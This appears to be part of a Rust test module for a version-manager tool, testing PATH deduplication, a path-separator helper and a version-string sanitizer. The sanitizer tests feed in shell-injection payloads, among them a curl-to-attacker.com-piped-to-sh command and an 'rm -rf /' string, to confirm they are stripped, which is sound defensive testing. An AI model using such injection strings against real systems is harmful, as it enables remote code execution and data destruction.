    /// The ballooning scenario: hook has prepended ven-bin twice, original
    /// is the user's startup PATH. After dedup, ven-bin should appear once
    /// at the front.
    #[test]
    fn dedup_ven_path_removes_duplicate_ven_entries() {
        let current = "/ven-bin:/a:/b:/ven-bin:/a:/b";
        let original = "/a:/b";
        let result = dedup_ven_path(current, original, ":");
        assert_eq!(result, "/ven-bin:/a:/b");
    }

    /// If `current` already looks clean, leave it alone.
    #[test]
    fn dedup_ven_path_no_change_when_clean() {
        let current = "/ven-bin:/a:/b";
        let original = "/a:/b";
        assert_eq!(dedup_ven_path(current, original, ":"), current);
    }

    /// User inserts a new entry between ven and the original: keep it.
    #[test]
    fn dedup_ven_path_preserves_user_inserted_entries() {
        // current = [ven-region] [user-added] [original-tail]
        // Here the user inserted /my-tool *after* ven-bin and *before* /a.
        let current = "/ven-bin:/my-tool:/a:/b";
        let original = "/a:/b";
        assert_eq!(
            dedup_ven_path(current, original, ":"),
            "/ven-bin:/my-tool:/a:/b"
        );
    }

    /// User wipes the original entirely (e.g., `export PATH=/x` in shell).
    /// We can't know what they wanted, so just dedup within current.
    #[test]
    fn dedup_ven_path_handles_missing_original() {
        let current = "/ven-bin:/x:/ven-bin";
        let original = "/nope";
        assert_eq!(dedup_ven_path(current, original, ":"), "/ven-bin:/x");
    }

    /// Windows path separator is `;`; smoke-test it.
    #[test]
    fn dedup_ven_path_uses_provided_separator() {
        let current = "C:\\ven;C:\\a;C:\\ven;C:\\a";
        let original = "C:\\a";
        assert_eq!(dedup_ven_path(current, original, ";"), "C:\\ven;C:\\a");
    }

    /// Empty input is a no-op.
    #[test]
    fn dedup_ven_path_empty() {
        assert_eq!(dedup_ven_path("", "", ":"), "");
    }

    #[test]
    fn path_separator_matches_platform() {
        let s = path_separator();
        if cfg!(target_os = "windows") {
            assert_eq!(s, ";");
        } else {
            assert_eq!(s, ":");
        }
    }

    #[test]
    fn sanitize_version_string_passes_valid_versions() {
        assert_eq!(sanitize_version_string("20.11.0"), "20.11.0");
        assert_eq!(sanitize_version_string("3.12.1"), "3.12.1");
        assert_eq!(sanitize_version_string("1.21.5"), "1.21.5");
        assert_eq!(sanitize_version_string("1.75.0"), "1.75.0");
        assert_eq!(sanitize_version_string("21.0.1"), "21.0.1");
        assert_eq!(sanitize_version_string("1.2.3-beta.1"), "1.2.3-beta.1");
        assert_eq!(sanitize_version_string("v20.11.0"), "v20.11.0");
        assert_eq!(sanitize_version_string("20_11_0"), "20_11_0");
    }

    #[test]
    fn sanitize_version_string_strips_dangerous_characters() {
        assert_eq!(sanitize_version_string("20\"; curl x|sh #"), "20curlxsh");
        assert_eq!(sanitize_version_string("'; rm -rf / #"), "rm-rf");
        assert_eq!(sanitize_version_string("1.0$(whoami)"), "1.0whoami");
        assert_eq!(sanitize_version_string("1.0`id`"), "1.0id");
        assert_eq!(
            sanitize_version_string("20\"; curl attacker.com | sh #'"),
            "20curlattacker.comsh"
        );
    }

    #[test]
    fn sanitize_version_string_empty_input() {
        assert_eq!(sanitize_version_string(""), "");
    }

    #[test]
    fn sanitize_version_string_preserves_separators() {
        assert_eq!(sanitize_version_string("1.2.3"), "1.2.3");
        assert_eq!(
            sanitize_version_string("1.2.3-alpha+build"),
            "1.2.3-alphabuild"
        );
    }
}
